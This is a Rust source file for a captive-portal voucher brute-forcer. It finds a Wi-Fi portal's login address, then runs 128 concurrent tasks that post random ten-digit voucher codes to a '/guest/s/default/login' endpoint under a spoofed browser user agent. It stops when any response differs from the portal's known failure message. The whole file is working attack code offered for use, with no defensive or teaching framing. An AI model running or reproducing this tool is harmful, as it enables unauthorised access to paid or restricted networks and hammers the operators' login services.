use std::cell::OnceCell;
use std::sync::Arc;

use color_eyre::eyre::eyre;
use rand::prelude::StdRng;
use rand::{Rng, SeedableRng};
use reqwest::StatusCode;
use tokio::sync::broadcast;
use url::Url;

static TASKS: u16 = 128;

#[tokio::main]
async fn main() -> color_eyre::Result<()> {
    let client = reqwest::ClientBuilder::new().user_agent("Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36").build()?;

    let res = client.get("http://detectportal.firefox.com/").send().await?;

    if res.status() != StatusCode::TEMPORARY_REDIRECT {
        return Err(eyre!("Could not detect portal (maybe already connected?)"));
    }

    let portal_url = Arc::new(match res.headers().get("Location") {
        Some(s) => s.to_str()?,
        None => return Err(eyre!("302 didn't have Location header"))
    }.to_string());

    // let portal_url = "http://127.0.0.1/amogus".to_string();

    println!("Detected portal {portal_url}");


    let portal_host = Arc::new(match Url::parse(&portal_url)?.host_str() {
        Some(h) => h,
        None => return Err(eyre!("Error extracting host from portal url")),
    }.to_string());


    let (tx, mut rx) = broadcast::channel::<()>(8);

    let done = OnceCell::new();

    for n in 0..TASKS {
        let portal_host = portal_host.clone();
        let portal_url = portal_url.clone();
        let tx = tx.clone();
        tokio::spawn(async move {
            let client = reqwest::ClientBuilder::new().user_agent("Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36").build().unwrap();
            let mut rng: StdRng = SeedableRng::from_entropy();

            loop {
                let voucher = rng.gen_range(0..=99999_99999u64);

                match client.post(format!("http://{}/guest/s/default/login", portal_host))
                    .header("Referer", portal_url.to_string())
                    .body(format!("{{\"by\":\"voucher\",\"voucher\":\"{voucher:010}\"}}"))
                    .send().await {
                    Ok(res) => {
                        if res.status() != StatusCode::OK {
                            println!("{n:03}|{voucher:010}: Status {}", res.status());
                            continue;
                        }
                        let body = match res.text().await {
                            Ok(t) => t,
                            Err(e) => {
                                println!("{n:03}|{voucher:010}: Err({e})");
                                continue;
                            }
                        };
                        if body == "{\"meta\":{\"rc\":\"error\",\"msg\":\"WelcomePage.FailedInternal\"},\"data\":[]}" {
                            println!("{n:03}|{voucher:010}: FAIL");
                        } else {
                            println!("{n:03}|{voucher:010}: PASS?: {body}");
                            tx.send(()).unwrap();
                        }
                    }
                    Err(e) => {
                        println!("{n:03}|{voucher:010}: Err({e})");
                        continue;
                    }
                };
            }
        });
    }

    rx.recv().await?;
    done.set(true).map_err(|_| eyre!("Failed to set done once cell"))?;

    println!("Successfully connected");

    Ok(())
}